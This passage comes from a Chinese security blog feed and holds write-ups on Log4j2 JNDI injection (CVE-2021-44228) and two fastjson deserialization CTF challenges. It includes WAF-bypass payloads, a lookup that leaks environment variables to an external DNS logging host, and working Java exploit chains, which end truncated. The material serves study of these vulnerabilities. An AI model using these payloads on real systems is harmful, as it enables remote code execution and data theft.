重新调用到substitute方法，跟进之后还是循环，只不过那些匹配都不成立了，好像substitute方法就是为了去掉 ${} 占位符的</p><p>继续往下走，又是循环，真的恶心，又是检测有没有 $，{，} 字符的，直接看最终结果</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/19.png" class><p>遍历完后走到这里，跟进resolveVariable方法</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/20.png" class><p>这里resolver有这么多类型，继续跟进到lookup方法</p><p>进入到了Interpolator类的lookup方法</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/21.png" class><p>通过分号将恶意代码分割成两部分，前一部分为jndi，通过strLookupMap查找对应类</p><p>可以看一下对应关系</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/22.png" class><p>最后调用JndiLookup的lookup方法，跟进</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/23.png" class><p>到此就结束了，继续跟进lookup方法就会走到JndiManager类的lookup方法，这是原生的JNDI注入的地方，已经不属于log4j2组件的范畴了。最后就是JNDI注入执行恶意命令，流程结束。</p><h3 id="4-调试小结"><a href="#4-调试小结" class="headerlink" title="4.调试小结"></a>4.调试小结</h3><p>当我们传入payload，首先判断输入的内容是否存在${}这些字符，然后截取占位符中的内容，也就是jndi:xxxx</p><p>然后用分号分割截取后的内容，分为jndi和xxxx(恶意代码)，jndi字符串用于在Map中查找自己对应的类，Map中支持的字符串有date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</p><p>选择出对应的解析器也就是JndiLookup调用lookup方法，实现JNDI注入</p><h2 id="0x03-绕过技巧"><a href="#0x03-绕过技巧" class="headerlink" title="0x03 绕过技巧"></a>0x03 绕过技巧</h2><p>看网上的资料，顺便提一下</p><p>推荐文章：<a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a></p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>可以通过env或者sys利用DNSlog外带，得到目标系统的系统变量或者环境变量，或者主机的key，例如</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logger.info(<span class="string">&quot;$&#123;jndi:ldap://$&#123;env:USER&#125;.dv3tdm.dnslog.cn&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><p>但是本地测试好像不行</p><h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><p>可能最多的就是针对于jndi，ldap关键词的检测</p><h4 id="利用分隔符和多个-绕过"><a href="#利用分隔符和多个-绕过" class="headerlink" title="利用分隔符和多个 ${} 绕过"></a>利用分隔符和多个 <code>$&#123;&#125;</code> 绕过</h4><p>官方文档写着，如果参数没有定义，那么 :- 后面的就是默认值</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/24.png" class><p>payload如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logger.error(<span class="string">&quot;$&#123;$&#123;::-J&#125;$&#123;what:-n&#125;di:ldap://127.0.0.1:8085/zRFaCCEj&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="大小写绕过（lower-和-upper）"><a href="#大小写绕过（lower-和-upper）" class="headerlink" title="大小写绕过（lower 和 upper）"></a>大小写绕过（lower 和 upper）</h4><p>也可以利用一些特殊字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ı =&gt; upper =&gt; i (Java 中测试可行)</span><br><span class="line">ſ =&gt; upper =&gt; S (Java 中测试可行)</span><br><span class="line">İ =&gt; upper =&gt; i (Java 中测试不可行)</span><br><span class="line">K =&gt; upper =&gt; k (Java 中测试不可行)</span><br></pre></td></tr></table></figure><p>payload如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logg.info(<span class="string">&quot;$&#123;$&#123;lower:J&#125;ndi:ldap://127.0.0.1:8085/zRFaCCEj&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>总结一句话就是，低版本的log4j2存在JNDI注入，可以任意代码执行。一行代码就可以获取服务器权限（滑稽）</p><p>在调试的时候还是比较头疼的，很多循环的代码很容易晕，所以在调这些繁琐难懂的java代码的时候，一定要静下心来，理解代码逻辑。</p><p>参考链接</p><p><a href="https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/#Log4j2-%E5%A4%8D%E7%8E%B0">log4j2复现</a></p><p><a href="https://johnfrod.top/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e5%a4%8d%e7%8e%b0/log4j2-jndi%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9ecve-2021-44228/"><a href="https://johnfrod.top/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/log4j2-jndi%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2021-44228/">Log4j2 JNDI注入漏洞(CVE-2021-44228)</a></a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> Log4j2 </tag>
            
            <tag> JNDI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022蓝帽杯Ez_gadget题目分析</title>
      <link href="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/"/>
      <url>/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>今天也来看一道关于fastjson的题目，不同于之前复现的题，蓝帽杯的这道更纯粹的考察fastjson的反序列化，而且是在开启AutoTypeSupport的情况下，题目难度也不是太高，但是也有很多需要学习的点。</p><h2 id="0x02-题目分析"><a href="#0x02-题目分析" class="headerlink" title="0x02 题目分析"></a>0x02 题目分析</h2><p>主要就两个类</p><h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/1.png" class><p>生成十六位的随机字符串，定义了一个getter方法返回字符串。重点还是路由</p><h3 id="JSONController"><a href="#JSONController" class="headerlink" title="JSONController"></a>JSONController</h3><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/2.png" class><p>定义了一个跟路由，返回一个随机key。定义一个json路由，第一层if判断</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (str != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">               Objects.hashCode(str) == secret.getKey().hashCode() &amp;&amp; !secret.getKey().equals(str))</span><br></pre></td></tr></table></figure><p>有点熟悉啊，有点神似php里的hash碰撞，但是不是一样的东西。这个if判断的意思就是两个不同字符串的hash值要相等，毋庸置疑，肯定是有的，问题是怎么找到，后面会讲。</p><p>第二个if就是一个黑名单，限制了用户的输入，它开启了AutoTypeSupport开关，最后就是parseObject函数对用户传进来的json进行fastjson反序列化。</p><h2 id="0x03-题目复现"><a href="#0x03-题目复现" class="headerlink" title="0x03 题目复现"></a>0x03 题目复现</h2><p>查看pom里有啥依赖</p><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/3.png" class><p>需要我们注意的就这两个，fastjson是1.2.62版本的，百度一下有没有可以打的payload。一搜还真有，还是CVE。</p><p>网上搜的payload：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://vps/Evil&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>恰好这个恶意类就在下面这个xbean的依赖里，确信就是这个啦。</p><h3 id="JndiConverter"><a href="#JndiConverter" class="headerlink" title="JndiConverter"></a>JndiConverter</h3><p>跟进源码看一下</p><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/4.png" class><p>很明显，存在JNDI注入。在往上找找有谁可以调用toObjectImpl方法，AsText属性还没有看到，肯定在父类，跟进看一下</p><h3 id="AbstractConverter"><a href="#AbstractConverter" class="headerlink" title="AbstractConverter"></a>AbstractConverter</h3><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/5.png" class><p>setter方法里调用了toObject方法</p><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/6.png" class><p>调用了目的方法。参数也可控，逻辑很简单，感觉没什么好说的。自己写一个demo测试payload发现可以弹出计算器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.propertyeditor.JndiConverter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackWp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:8085/FxzcrxXy\&quot;&#125;&quot;</span>;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好奇它是怎么绕过checkAutoType方法的，跟进看一下</p><p>前面的都差不多</p><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/7.png" class><p>看这里，设置两个十六进制数，对classname的第一个字符和最后一个字符分别异或再相乘，可以把它看作一种hash运算，可以类似于一种黑名单检测，继续往下走</p><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/8.png" class><p>autoTypeSupport是开启的，所以会走到这个if分支里，它从第四位开始，对classname的每一个字符进行hash运算，然后查找它是不是在期望类里。如果是，类加载。如果不是，判断是否在黑名单中，这些都不满足，所以往下走</p><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/9.png" class><p>来到这里，AutoTypeSupport开启，所以会走到这个if分支里，完成类的加载。之前都是从各种缓存里找，也找不到。</p><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/10.png" class><p>最后也是绕过一些异常，添加缓存，返回clazz</p><h3 id="hash问题"><a href="#hash问题" class="headerlink" title="hash问题"></a>hash问题</h3><p>执行命令的payload也有了，那么就剩下绕过两个if了。</p><p>看一下hashCode方法的内部逻辑</p><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/11.png" class><p>翻译过来就是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashCode(S)=S[0]∗31^n−1+S[1]∗31^n−2+...+S[n−2]∗31+S[n−1]</span><br></pre></td></tr></table></figure><p>在网上找到相关的文章，其中是这么说的</p><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/12.png" class><p>将第一个字母-1，第二个字母+31，就可以满足hash值相等</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;#&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(parse.quote(<span class="built_in">chr</span>(<span class="built_in">ord</span>(key[<span class="number">0</span>]) - <span class="number">1</span>) + <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[<span class="number">1</span>]) + <span class="number">31</span>) + key[<span class="number">2</span>::]))</span><br></pre></td></tr></table></figure><p>另一个黑名单的问题，可以用unicode编码或者%0a换行绕过</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>访问根路由获取key</p><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/13.png" class><p>利用脚本生成相同hash值的字符串</p><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/14.png" class><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/15.png" class><p>配置好反连</p><p>burp发包，弹出计算器</p><img src="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/16.png" class>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> ctf </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023阿里云CTF-ezbean题目复现与分析</title>
      <link href="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
      <url>/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近也不怎么想学习了，这道题的复现前天就开始了，一直鸽到了现在。感觉对fastjson还是不太熟，这道题复现完也不是很容易，里面有些细小的知识点还不太弄懂，先水一篇文章吧，后续再完善一下。</p><h2 id="0x02-题目分析"><a href="#0x02-题目分析" class="headerlink" title="0x02 题目分析"></a>0x02 题目分析</h2><p>当时比赛后我直接把源码赋值粘贴在idea里，这样更好看。先看依赖</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/1.png" class><p>没啥特别的，就是1.2.60版本的fastjson</p><p>控制器中也只有一个路由，作为反序列化的入口点</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/2.png" class><p>另外重写了一个输入流的类，有黑名单的限制，这只是在传统的反序列化中做的限制，后面会说到。</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/3.png" class><p>另外还定义了一个javabean，代码就不全贴出来了，不过有一个getter方法值得我们注意</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/4.png" class><p>调用任意类的connect方法，这可以作为提示，也是突破口。</p><h2 id="0x03-利用思路分析"><a href="#0x03-利用思路分析" class="headerlink" title="0x03 利用思路分析"></a>0x03 利用思路分析</h2><h3 id="RMIconnetor类与JNDI注入"><a href="#RMIconnetor类与JNDI注入" class="headerlink" title="RMIconnetor类与JNDI注入"></a>RMIconnetor类与JNDI注入</h3><p>前段时间看过二次反序列化，对这个类也不太陌生，它也可以二次反序列化，但是本题中不需要用到它的这个功能。跟进到它的connect方法来看一看</p><h4 id="RMIconnetor-connect"><a href="#RMIconnetor-connect" class="headerlink" title="RMIconnetor#connect"></a>RMIconnetor#connect</h4><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/5.png" class><p>我们需要走到这个findRMIServer方法里，就需要满足rmiServer为空，这个方法的参数是jmxServiceURL对象</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/6.png" class><p>不赋值就默认为空了，跟进findRMIServer方法</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/7.png" class><p>它这里会获取到jmxServiceURL对象的路径，这里路径开头要是”&#x2F;jndi&#x2F;“，因为我们要打JNDI注入。跟进到findRMIServerJNDI方法</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/8.png" class><p>漏洞利用点就在这里，接下来就是jmxServiceURL对象里的路径怎么写，跟进看一下</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/9.png" class><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/10.png" class><p>按照严格的路径格式，不然会抛出异常</p><p>根据这些信息就可以写一个漏洞触发的demo了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.ezser.test;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi:///jndi/ldap://127.0.0.1:8085/tOYpTiIz&quot;</span>);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL,<span class="literal">null</span>);</span><br><span class="line">        rmiConnector.connect();</span><br></pre></td></tr></table></figure><p>运行后也是可以弹出计算器的。RMIConnector类的全限定名是在黑名单里面的，这里就需要把它放在fastjson里，黑名单只限制在了普通的序列化中，而fastjson序列化有自己独有的一套规则，不受黑名单的限制，而在序列化的时候会调用getter方法，也就是需要调用Mybean类的getConnect方法，那么这一切都说的通了。</p><h3 id="JSONArray的toString方法触发getter的分析"><a href="#JSONArray的toString方法触发getter的分析" class="headerlink" title="JSONArray的toString方法触发getter的分析"></a>JSONArray的toString方法触发getter的分析</h3><p>链子的后半段分析完了，前半段就是寻找能够调用调用getter的利用链，这里主要分析toString方法触发getter。</p><p>我们去看JSONArray的toString方法，实际上就是看JSON的toString方法。跟进后看，调用的是toJSONString方法，这个方法不就是fastjson序列化的方法嘛，总的来说就是实现一个fastjson序列化的功能</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/11.png" class><p>创建一个字符流对象out，实例化一个序列化器，把序列化后的结果赋值给out，所以这个write算是更深层次的序列化函数，跟进。</p><p>这种源码还是调试看比较好</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/12.png" class><p>通过不同的java类选择自己的ObjectSerializer，无关紧要，</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/13.png" class><h3 id="ListSerializer-write"><a href="#ListSerializer-write" class="headerlink" title="ListSerializer#write"></a>ListSerializer#write</h3><p>跟进到ListSerializer的write方法里</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/14.png" class><p>遍历出JSONArray中的键值是Mybean类，然后就判断这个类的类型。</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/15.png" class><p>找到Mybean这个类所对应的序列化器。可以跟进这个方法看一下，原本没有Mybean所对应的序列化器，找不到，所以它需要动态的创建自己的序列化器。</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/16.png" class><p>跟进这个方法，</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/17.png" class><p>遍历Mybean的字段信息，</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/18.png" class><p>此时的beanInfo就是对Mybean类的封装，获取到这些信息后创建ASM序列化器，这是动态生成的，可以跟进看一下创建序列化器的工厂方法。</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/19.png" class><p>遍历它的字段和getter方法，然后创建如下命名格式的序列化器。然后我们回到ListSerializer的write方法</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/20.png" class><p>可以看到是创建了它的序列化器的，接下来调用write方法完成序列化，调用Mybean的所有getter方法。</p><p>那么回过头来，什么方法调用了toString方法，那么这个方法就很容易想到了</p><h3 id="BadAttributeValueExpException-readObject"><a href="#BadAttributeValueExpException-readObject" class="headerlink" title="BadAttributeValueExpException#readObject"></a>BadAttributeValueExpException#readObject</h3><p>这个作为反序列化的入口类就很常见了</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/21.png" class><p>不必再说。</p><h2 id="0x04-题目复现"><a href="#0x04-题目复现" class="headerlink" title="0x04 题目复现"></a>0x04 题目复现</h2><h3 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h3><p>可以简单总结一下这道题的思路，大致分为三个部分</p><blockquote><p>第一，也就是题目中的反序列化点，利用BadAttributeValueExpException类的readObject方法来调用到fastjson库里json的toString方法，从而转变为fastjson的序列化，也顺便绕过黑名单。</p><p>第二，触发toString方法后会自动调用toJSONString方法，执行fastjson的序列化并且触发getter。</p><p>第三，Mybean的getConnect触发后，会调用RMIconnetor的connect方法，导致JNDI注入执行恶意命令。</p></blockquote><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.ezser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.ctf.ezser.bean.MyBean;</span><br><span class="line"><span class="keyword">import</span> com.ctf.ezser.utils.MyObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackWp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi:///jndi/ldap://127.0.0.1:8085/OyJWpWMt&quot;</span>);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">MyBean</span> <span class="variable">myBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyBean</span>();</span><br><span class="line">        setFieldValue(myBean,<span class="string">&quot;conn&quot;</span>,rmiConnector);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(myBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baor);</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(baor.toByteArray())));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String name,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span 